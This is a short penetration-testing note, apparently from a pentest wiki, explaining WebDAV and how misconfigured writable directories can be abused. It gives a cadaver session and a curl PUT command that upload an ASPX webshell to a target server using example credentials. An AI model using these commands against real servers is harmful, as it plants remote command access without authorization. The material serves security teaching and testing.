# WebDAV

WebDAV extends the functionality of the HTTP protocol to allow **remote file management over the web**. It introduces additional HTTP methods that enable tasks such as file uploads, downloads, edits, and deletions directly on a web server, effectively turning the server into a remote file system. Within penetration testing, WebDAV is of particular interest because misconfigurations often expose writable directories that attackers can exploit to upload and execute malicious files, thereby escalating access.

[Cadaver](https://github.com/notroj/cadaver) is a command-line WebDAV client designed to interact with WebDAV-enabled servers. It provides a simple interface for performing operations such as browsing directories, transferring files, and modifying resources remotely.

```bash
$ cadaver http://target
Authentication required for target on server `x7331':
Username: x7331
Password:
# Upload a webshell on the target server
dav:/> put /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx
```
{% endcode %}
{% endtab %}

Files can also be uploaded with a `PUT` request using `curl`:

{% code overflow="wrap" %}
```bash
curl -T '/home/kali/shell.aspx' 'http://target/' -u x7331:Pass123!
```
{% endcode %}
{% endtab %}
